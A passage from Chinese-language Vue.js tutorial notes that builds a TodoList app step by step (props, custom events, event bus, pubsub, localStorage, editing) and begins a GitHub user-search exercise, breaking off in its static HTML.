  components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
    }
  }, methods: {},
}
</script>
<style >
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}

.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

</style>
```



### MyFooter.vue



```java
<template>
  <div class="todo-footer">
    <label>
      <input type="checkbox"/>
    </label>
    <span>
          <span>已完成0</span> / 全部2
        </span>
    <button class="btn btn-danger">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "MyFooter",
  data() {
    return {}
  }
}
</script>

<style scoped>

/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}

</style>
```





### MyHeader.vue



```java
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认"/>
  </div>
</template>

<script>
export default {
  name: "MyHead",
  data() {
    return {}
  }
}
</script>

<style scoped>
/*header*/
.todo-header input {
  width: 560px;
  height: 28px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding: 4px 7px;
}

.todo-header input:focus {
  outline: none;
  border-color: rgba(82, 168, 236, 0.8);
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```



### MyItem.vue



```java
<template>
  <li>
    <label>
      <input type="checkbox"/>
      <span>xxxxx</span>
    </label>
    <button class="btn btn-danger" style="display:none">删除</button>
  </li>
</template>

<script>
export default {
  name: "MyItem",
  data() {
    return {}
  }
}
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}
</style>
```



### MyList.vue



```java
<template>
  <ul class="todo-main">
      <MyItem></MyItem>
  </ul>
</template>

<script>
import MyItem from "@/components/todoList/MyItem";

export default {
 name: "MyList",
 data(){
    return{}
 },components:{MyItem}
}
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```



### 页面展示



<img src="images/image-20211227154048195.png" alt="image-20211227154048195" style="zoom:80%;" />



### vue开发者工具



<img src="images/image-20211227154109415.png" alt="image-20211227154109415" style="zoom:80%;" />



## 初始化列表



### MyList.vue



```java
<template>
  <ul class="todo-main">
      <MyItem v-for="(todo,index) in todos" :key="todo.id" :index="index" :todo="todo"></MyItem>
  </ul>
</template>

<script>
import MyItem from "@/components/todoList/MyItem";

export default {
 name: "MyList",
 data(){
    return{
      todos:[
        {id:'001',title:'抽烟',done:true},
        {id:'002',title:'喝酒',done:false},
        {id:'003',title:'美女',done:true},
        {id:'004',title:'开车',done:true}
      ]
    }
 },components:{MyItem}
}
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```





### MyItem.vue



```java
<template>
  <li>
    <label>
      <input type="checkbox" v-bind:checked="todo.done"/>
      <span>{{todos.title}}</span>
    </label>
    <button class="btn btn-danger" style="display:none">删除</button>
  </li>
</template>

<script>
export default {
  name: "MyItem",
  data() {
    return {
      todos:this.todo
    }
  },props:['todo']
}
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}
</style>
```





### 页面效果



<img src="images/image-20211227155424503.png" alt="image-20211227155424503" style="zoom:80%;" />

## 安装nanoid(id生成插件)



```java
npm i nanoid
```



接下来可能用到



## 添加一个todo



### 需求分析



我们现在要增加一个todo，但是数据在MyList组件中，所以我们需要把数据换一个位置，因为这样我们通过pops来传递。

然后通过子类类调用父类的方法来传递值

<img src="images/image-20211227164220003.png" alt="image-20211227164220003" style="zoom:80%;" />



### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
          <MyHead :addTodo="addTodo"></MyHead>
          <MyList :todos="todos"></MyList>
          <MyFooter></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";
export default {
  name: "App",
  components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      todos:[
        {id:'001',title:'抽烟',done:true},
        {id:'002',title:'喝酒',done:false},
        {id:'003',title:'美女',done:true},
        {id:'004',title:'开车',done:true}
      ]
    }
  }, methods: {
    addTodo(x) {
      this.msg = '12312'
      console.log('app组件接收到信息',x)
      this.todos.unshift(x)
    }
  },
}
</script>
<style >
/*css省略*/
</style>
```





### MyHead.vue



```java
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
  </div>
</template>

<script>

export default {
  name: "MyHead",
  props:['addTodo'],
  data() {
    return {
      title:''
    }
  }, methods: {
    add() {
      this.msg = '12312'
      const todoList = {id:Date.now(),title:this.title,done: false}
      this.addTodo(todoList)
    }
  }
}
</script>

<style scoped>
/*css省略*/
</style>
```





### MList.vue



```java
<template>
  <ul class="todo-main">
    <MyItem v-for="(todo,index) in todos" :key="todo.id" :index="index" :todo="todo"></MyItem>
  </ul>
</template>

<script>
import MyItem from "@/components/todoList/MyItem";

export default {
  name: "MyList",
  props: ['todos'],
  data() {
    return {
      myTodos:this.todos
    }
  }, components: {MyItem}
}
</script>

<style scoped>
/*css省略*/
</style>
```





### 效果



<img src="images/image-20211227164925760.png" alt="image-20211227164925760" style="zoom:80%;" />





## 勾选切换状态



### 需求分析



按照我们所学的内容，肯定是利用props来传递数据。

App组件—>MyList组件—>MyItem组件

是不是很麻烦，后面我们学习完订阅发布就不会这么麻烦了



### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
          <MyHead :addTodo="addTodo"></MyHead>
          <MyList :todos="todos" :checkTodo="checkTodo"></MyList>
          <MyFooter></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";


export default {
  name: "App",
  components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      todos:[
        {id:'001',title:'抽烟',done:true},
        {id:'002',title:'喝酒',done:false},
        {id:'003',title:'美女',done:true},
        {id:'004',title:'开车',done:true}
      ]
    }
  }, methods: {
    addTodo(x) {
      this.msg = '12312'
      console.log('app组件接收到信息',x)
      this.todos.unshift(x)
    },
    checkTodo(id){
      this.todos.forEach((item)=>{
        if (item.id === id) {
          item.done=!item.done
          return;
        }
      })
    }
  },
}
</script>
<style >
/*****************css省略****************/
</style>
```



### MyList.vue



```java
<template>
  <ul class="todo-main">
    <MyItem v-for="(todo,index) in todos" :key="todo.id" :index="index" :todo="todo" :checkTodo="checkTodo"></MyItem>
  </ul>
</template>

<script>
import MyItem from "@/components/todoList/MyItem";

export default {
  name: "MyList",
  props: ['todos','checkTodo'],
  data() {
    return {
      myTodos:this.todos
    }
  }, components: {MyItem}
}
</script>

<style scoped>
/*****************css省略****************/
</style>
```



### MyItem.vue



```java
<template>
  <li>
    <label>
      <input type="checkbox" v-bind:checked="todo.done" @change="handleChecked(todo.id)"/>
      <span>{{todos.title}}</span>
    </label>
    <button class="btn btn-danger" style="display:none">删除</button>
  </li>
</template>

<script>
export default {
  name: "MyItem",
  data() {
    return {
      todos:this.todo
    }
  },props:['todo','checkTodo']
  ,methods:{
    handleChecked(id){
      this.checkTodo(id)
    }
  }
}
</script>

<style scoped>
/*****************css省略****************/
</style>
```



## 删除



### 需求分析



增加删除按钮

再通过props来传递方法



### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHead :addTodo="addTodo"></MyHead>
        <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"></MyList>
        <MyFooter></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";


export default {
  name: "App",
  components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      todos: [
        {id: '001', title: '抽烟', done: true},
        {id: '002', title: '喝酒', done: false},
        {id: '003', title: '美女', done: true},
        {id: '004', title: '开车', done: true}
      ]
    }
  }, methods: {
    addTodo(x) {
      this.msg = '12312'
      console.log('app组件接收到信息', x)
      this.todos.unshift(x)
    },
    checkTodo(id) {
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done
          return;
        }
      })
    }, deleteTodo(id) {
      console.log(id)
      this.todos = this.todos.filter((item) => {
       return  item.id !== id
      });
    }
  },
}
</script>
<style>
/*****************css省略****************/

</style>
```





### MyList.vue





```java
<template>
  <ul class="todo-main">
    <MyItem v-for="(todo,index) in todos" :key="todo.id" :index="index" :todo="todo" :checkTodo="checkTodo" :deleteTodo="deleteTodo"></MyItem>
  </ul>
</template>

<script>
import MyItem from "@/components/todoList/MyItem";

export default {
  name: "MyList",
  props: ['todos','checkTodo','deleteTodo'],
  data() {
    return {
      myTodos:this.todos
    }
  }, components: {MyItem}
}
</script>

<style scoped>
/*****************css省略****************/

</style>
```





### MyItem.vue



```java
<template>
  <li>
    <label>
      <input type="checkbox" v-bind:checked="todo.done" @change="handleChecked(todo.id)"/>
      <span>{{ todos.title }}</span>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>

<script>
export default {
  name: "MyItem",
  data() {
    return {
      todos: this.todo
    }
  }, props: ['todo', 'checkTodo','deleteTodo']
  , methods: {
    handleChecked(id) {
      this.checkTodo(id)
    }, handleDelete(id) {
      if(confirm('确定删除吗？')){
        this.deleteTodo(id)
      }
    }
  }
}
</script>

<style scoped>
/*****************css省略以下是新增加的****************/

li:hover{
  background-color: #ddd;
}

li:hover button{
  display: block;
}
</style>
```



### 效果



<img src="images/image-20211227172115351.png" alt="image-20211227172115351" style="zoom:80%;" />



## 底部统计



### 需求分析



页面上统计我们就可以使用到那个计算属性。



### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHead :addTodo="addTodo"></MyHead>
        <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"></MyList>
        <MyFooter :todos="todos"></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";


export default {
  name: "App",
  components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      todos: [
        {id: '001', title: '抽烟', done: true},
        {id: '002', title: '喝酒', done: false},
        {id: '003', title: '美女', done: true},
        {id: '004', title: '开车', done: true}
      ]
    }
  }, methods: {
    addTodo(x) {
      this.msg = '12312'
      console.log('app组件接收到信息', x)
      this.todos.unshift(x)
    },
    checkTodo(id) {
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done
          return;
        }
      })
    }, deleteTodo(id) {
      console.log(id)
      this.todos = this.todos.filter((item) => {
       return  item.id !== id
      });
    }
  },
}
</script>
<style>
/*****************css省略****************/

</style>
```





### MyFooter.vue



```java
<template>
  <div class="todo-footer">
    <label>
      <input type="checkbox"/>
    </label>
    <span>
          <span>已完成{{ doneTotal }}</span> / 全部{{ total }}
        </span>
    <button class="btn btn-danger">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "MyFooter",
  props: ['todos'],
  data() {
    return {}
  },
  computed: {
    total() {
      return this.todos.length
    },
    doneTotal() {
      //第一值是上次计算的值，第二个是对象
      return this.todos.reduce((pre, sufix) => {
        return pre + (sufix.done ? 1 : 0)
      }, 0)//设置初始迭代值
    }
  }
}
</script>

<style scoped>

/*****************css省略****************/

</style>
```



## 底部交互



### 需求统计



底部的全选全删除



### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHead :addTodo="addTodo"></MyHead>
        <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"></MyList>
        <MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";


export default {
  name: "App",
  components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      todos: [
        {id: '001', title: '抽烟', done: true},
        {id: '002', title: '喝酒', done: false},
        {id: '003', title: '美女', done: true},
        {id: '004', title: '开车', done: true}
      ]
    }
  }, methods: {
    addTodo(x) {
      this.msg = '12312'
      console.log('app组件接收到信息', x)
      this.todos.unshift(x)
    },
    checkTodo(id) {
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done
          return;
        }
      })
    }, deleteTodo(id) {
      console.log(id)
      this.todos = this.todos.filter((item) => {
       return  item.id !== id
      });
    },
    //全选or取消全选
    checkAllTodo(done){
      this.todos.forEach((todo)=>{
        todo.done = done
      })
    },
  //清除所有已经完成的todo
  clearAllTodo(){
    this.todos = this.todos.filter((todo)=>{
      return !todo.done
    })
  }
  },
}
</script>
<style>
/*****************css省略****************/
</style>
```



### MyFooter.vue



```java
<template>
  <div class="todo-footer">
    <label>
      <input type="checkbox" v-model="isAll"/>
    </label>
    <span>
          <span>已完成{{ doneTotal }}</span> / 全部{{ total }}
        </span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "MyFooter",
  props: ['todos','checkAllTodo','clearAllTodo'],
  data() {
    return {}
  },
  computed: {
    total() {
      return this.todos.length
    },
    doneTotal() {
      //第一值是上次计算的值，第二个是对象
      return this.todos.reduce((pre, sufix) => {
        return pre + (sufix.done ? 1 : 0)
      }, 0)//设置初始迭代值
    },
    isAll: {
      get() {
        return this.doneTotal === this.total && this.total > 0
      },
      set(value) {
        this.checkAllTodo(value)
      }
    }
  },methods:{
    //清空所有已完成
    clearAll(){
      this.clearAllTodo()
    }
  }
}
</script>

<style scoped>

/*****************css省略****************/
</style>
```









## TodoList第一次总结



1. 组件化编码流程：

   ​	(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

   ​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

   ​			1).一个组件在用：放在组件自身即可。

   ​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

   ​	(3).实现交互：从绑定事件开始。

2. props适用于：

   ​	(1).父组件 ==> 子组件 通信

   ​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。



## TodoList使用游览器本地缓存





### 注意



[建议学完7.9：游览器的存储功能](#7.9：游览器的存储功能)



### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHead :addTodo="addTodo"></MyHead>
        <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"></MyList>
        <MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";


export default {
  name: "App",
  components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      //由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
      todos:JSON.parse(localStorage.getItem('todos')) || []
    }
  }, methods: {
    addTodo(x) {
      this.msg = '12312'
      console.log('app组件接收到信息', x)
      this.todos.unshift(x)
    },
    checkTodo(id) {
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done
          return;
        }
      })
    }, deleteTodo(id) {
      console.log(id)
      this.todos = this.todos.filter((item) => {
       return  item.id !== id
      });
    },
    //全选or取消全选
    checkAllTodo(done){
      this.todos.forEach((todo)=>{
        todo.done = done
      })
    },
  //清除所有已经完成的todo
  clearAllTodo(){
    this.todos = this.todos.filter((todo)=>{
      return !todo.done
    })
  }
  },watch:{
    todos:{
      deep:true, //开始深度监视
      handler(value){
        console.log(value)
        localStorage.setItem('todos',JSON.stringify(value))
      }
    }
  }
}
</script>
<style>
/*忽略css*/

</style>
```





## TodoLIst使用自定义事件



### 注意



[建议学完7.10：组件间的自定义事件](#7.10：组件间的自定义事件)



### 需求分析



+ 原有的todolist项目页面不用动
+ 我们修改的组件有
  + app
  + MyHeader
  + MyFooter

+ **以下代码为了更好观看只展示修改部分**

### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHead @addTodo="addTodo"></MyHead>
        <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"></MyList>
        <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
//没有修改的地方，省略掉
</script>
<style>
//没有修改的地方，省略掉
</style>
```



### MyHeader.vue



```java
<template>
//没有修改的地方，省略掉
</template>
<script>
export default {
  name: "MyHead",
  // props:['addTodo'],
  data() {
    return {
      title:''
    }
  }, methods: {
    add() {
      this.msg = '12312'
      const todoList = {id:Date.now(),title:this.title,done: false}
      // this.addTodo(todoList)
      this.$emit('addTodo',todoList)
    }
  }
}
</script>

<style scoped>
//没有修改的地方，省略掉
</style>
```





### MyFooter



```java
<template>
  //没有修改的地方，省略掉
</template>

<script>
export default {
  name: "MyFooter",
  props: ['todos', 'checkAllTodo', 'clearAllTodo'],
  data() {
    return {}
  },
  computed: {
    total() {
      return this.todos.length
    },
    doneTotal() {
      //第一值是上次计算的值，第二个是对象
      return this.todos.reduce((pre, sufix) => {
        return pre + (sufix.done ? 1 : 0)
      }, 0)//设置初始迭代值
    },
    isAll: {
      get() {
        return this.doneTotal === this.total && this.total > 0
      },
      set(value) {
        // this.checkAllTodo(value)
        this.$emit("checkAllTodo", value)
      }
    }
  }, methods: {
    //清空所有已完成
    clearAll() {
      // this.clearAllTodo()
      this.$emit('clearAllTodo');
    }
  }
}
</script>
<style scoped>
//没有修改的地方，省略掉
</style>
```







## TodoList全局时间总线



### 学到哪里



[我们要学到：全局事件总线（GlobalEventBus）](#8.1：全局事件总线（GlobalEventBus）)



### main,js



```java
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

window.x = {a: 1, b: 2}
new Vue({
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this
    }
}).$mount('#app')
```



### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHead @addTodo="addTodo"></MyHead>
        <MyList :todos="todos" ></MyList>
        <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";

export default {
  name: "App",
  components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      //由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
      todos: JSON.parse(localStorage.getItem('todos')) || []
    }
  },
  methods: {
    addTodo(x) {
      this.msg = '12312'
      console.log('app组件接收到信息', x)
      this.todos.unshift(x)
    },
    checkTodo(id) {
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done
          return;
        }
      })
    }, deleteTodo(id) {
      console.log(id)
      this.todos = this.todos.filter((item) => {
        return item.id !== id
      });
    },
    //全选or取消全选
    checkAllTodo(done) {
      this.todos.forEach((todo) => {
        todo.done = done
      })
    },
    //清除所有已经完成的todo
    clearAllTodo() {
      this.todos = this.todos.filter((todo) => {
        return !todo.done
      })
    }
  }, watch: {
    todos: {
      deep: true, //开始深度监视
      handler(value) {
        console.log(value)
        localStorage.setItem('todos', JSON.stringify(value))
      }
    }
  },mounted() {
    this.$bus.$on("checkTodo",this.checkTodo)
    this.$bus.$on("deleteTodo",this.deleteTodo)
  },beforeDestroy() {
    this.$bus.$off("checkTodo");
    this.$bus.$off("deleteTodo");
  }
}
</script>
<style>
/*base*/
</style>
```





### MyList.vue



```java
<template>
  <ul class="todo-main">
    <MyItem v-for="(todo,index) in todos" :key="todo.id" :index="index" :todo="todo" ></MyItem>
  </ul>
</template>
<script>
import MyItem from "@/components/todoList/MyItem";
export default {
  name: "MyList",
  props: ['todos'],
  data() {
    return {
      myTodos:this.todos
    }
  }, components: {MyItem}
}
</script>

<style scoped>

</style>
```





### MyItem.vue





```java
<template>
  <li>
    <label>
      <input type="checkbox" v-bind:checked="todo.done" @change="handleChecked(todo.id)"/>
      <span>{{ todos.title }}</span>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>
<script>
export default {
  name: "MyItem",
  data() {
    return {
      todos: this.todo
    }
  }, props: ['todo']
  , methods: {
    handleChecked(id) {
      // this.checkTodo(id)
      this.$bus.$emit("checkTodo",id)
    }, handleDelete(id) {
      if(confirm('确定删除吗？')){
        // this.deleteTodo(id)
        this.$bus.$emit("deleteTodo",id)
      }
    }
  }
}
</script>

<style scoped>

</style>
```



### 测试



页面测试选中功能和删除功能



## TodoList消息订阅与发布



### 学到哪里



[8.2：消息订阅发布](#8.2：消息订阅发布)





### app.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHead @addTodo="addTodo"></MyHead>
        <MyList :todos="todos"></MyList>
        <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";
import Schools from "@/components/Schools";
import student from "@/components/student";
import pubsub from  'pubsub-js'
export default {
  name: "App",
  components: {MyList, MyFooter, MyHead, Schools, student},
  // components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      //由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
      todos: JSON.parse(localStorage.getItem('todos')) || []
    }
  },
  methods: {
    addTodo(x) {
      this.msg = '12312'
      console.log('app组件接收到信息', x)
      this.todos.unshift(x)
    },
    checkTodo(id) {
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done
          return;
        }
      })
    }, 
      deleteTodo(methodName,id) {
      console.log(methodName)
      console.log(id)
      this.todos = this.todos.filter((item) => {
        return item.id !== id
      });
    },
    //全选or取消全选
    checkAllTodo(done) {
      this.todos.forEach((todo) => {
        todo.done = done
      })
    },
    //清除所有已经完成的todo
    clearAllTodo() {
      this.todos = this.todos.filter((todo) => {
        return !todo.done
      })
    }
  }, watch: {
    todos: {
      deep: true, //开始深度监视
      handler(value) {
        console.log(value)
        localStorage.setItem('todos', JSON.stringify(value))
      }
    }
  }, mounted() {
    this.$bus.$on("checkTodo", this.checkTodo)
    this.$bus.$on("deleteTodo", this.deleteTodo)
    this.pubId = pubsub.subscribe('deleteTodo',this.deleteTodo)//更新的地方在这
  }, beforeDestroy() {
    this.$bus.$off("checkTodo");
    this.$bus.$off("deleteTodo");
    pubsub.unsubscribe(this.pubId)
  }
}
</script>
<style>


</style>
```





### MyItem.vue



```java
<template>
  <li>
    <label>
      <input type="checkbox" v-bind:checked="todo.done" @change="handleChecked(todo.id)"/>
      <span>{{ todos.title }}</span>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>

<script>
import pubsub from 'pubsub-js'
export default {
  name: "MyItem",
  data() {
    return {
      todos: this.todo
    }
  }, props: ['todo']
  , methods: {
    handleChecked(id) {
      // this.checkTodo(id)
      this.$bus.$emit("checkTodo",id)
    }, handleDelete(id) {
      if(confirm('确定删除吗？')){
        // this.deleteTodo(id)
        // this.$bus.$emit("deleteTodo",id)
        pubsub.publish('deleteTodo',id)
      }
    }
  }
}
</script>

<style scoped>

</style>
```



 

## TodoList编辑功能



### app.vue



新增加`updateTodo`方法

```java
<template>
	//******************省略****************************//
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";

import pubsub from  'pubsub-js'
export default {
  name: "App",
  components: {MyList, MyFooter, MyHead},
  // components: {MyList, MyFooter, MyHead},
  data() {
    return {
      msg: '小糊涂',
      //由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
      todos: JSON.parse(localStorage.getItem('todos')) || []
    }
  },
  methods: {
  	//******************省略****************************//
    //更新一个todo
    updateTodo(id,title){
      this.todos.forEach((todo)=>{
        if(todo.id === id) todo.title = title
      })
    }
  }, watch: {
   	//******************省略****************************//
  }, mounted() {
	//******************省略****************************//
    this.$bus.$on('updateTodo',this.updateTodo)

  }, beforeDestroy() {
	//******************省略****************************//
    this.$bus.$off('updateTodo')
  }
}
</script>
<style>

</style>
```



### MyItem.vue



```java
<template>
  <li>
    <label>
      <input type="checkbox" v-bind:checked="todo.done" @change="handleChecked(todo.id)"/>
      <span v-show="!todo.isEdit">{{todo.title}}</span>
      <input
          type="text"
          v-show="todo.isEdit"
          :value="todo.title"
          @blur="handleBlur(todo,$event)"
          id="inputTitle"
      >
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
    <button v-show="!todo.isEdit" class="btn btn-edit" @click="handleEdit(todo)">编辑</button>
  </li>
</template>

<script>
import pubsub from 'pubsub-js'
export default {
  name: "MyItem",
  data() {
    return {
    }
  }, props: ['todo']
  , methods: {
    handleChecked(id) {
      // this.checkTodo(id)
      this.$bus.$emit("checkTodo",id)
    },
    handleDelete(id) {
      if(confirm('确定删除吗？')){
        // this.deleteTodo(id)
        // this.$bus.$emit("deleteTodo",id)
        pubsub.publish('deleteTodo',id)
      }
    },
    //编辑
    handleEdit(todo){
      console.log(todo)
      if(  Object.prototype.hasOwnProperty.call(todo, "isEdit")){
        todo.isEdit = true
      }else{
        // console.log('@')
        this.$set(todo,'isEdit',true)
      }
      this.$nextTick(function(){
       document.getElementById('inputTitle').focus()
      })
    },
    //失去焦点回调（真正执行修改逻辑）
    handleBlur(todo,e){
      todo.isEdit = false
      if(!e.target.value.trim()) return alert('输入不能为空！')
      this.$bus.$emit('updateTodo',todo.id,e.target.value)
    }
  }
}
</script>

<style scoped>

</style>
```







# 项目练习：GitHub搜索



## 静态页面



### css





bootstrap.css需要

index.css

```java
.album {
  min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;
  padding-bottom: 3rem;
  background-color: #f7f7f7;
}

.card {
  float: left;
  width: 33.333%;
  padding: .75rem;
  margin-bottom: 2rem;
  border: 1px solid #efefef;
  text-align: center;
}

.card > img {
  margin-bottom: .75rem;
  border-radius: 100px;
}

.card-text {
  font-size: 85%;
}

```





### html





````java
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <link rel="stylesheet" href="./bootstrap.css">
  <link rel="stylesheet" href="./index.css">
</head>
<body>
<div id="app">
  <div class="container">
    <section class="jumbotron">
      <h3 class="jumbotron-heading">Search Github Users</h3>
      <div>
        <input type="text" placeholder="enter the name you search"/>&nbsp;<button>Search</button>
      </div>
    </section>
    <div class="row">
      <div class="card">
        <a href="https://github.com/xxxxxx" target="_blank">
          <img src="https://cn.vuejs.org/images/logo.svg" style='width: 100px'/>
        </a>
        <p class="card-text">xxxxxx</p>
      </div>
      <div class="card">
        <a href="https://github.com/xxxxxx" target="_blank">
          <img src="https://cn.vuejs.org/images/logo.svg" style='width: 100px'/>
        </a>
        <p class="card-text">xxxxxx</p>
      </div>
      <div class="card">
        <a href="https://github.com/xxxxxx" target="_blank">
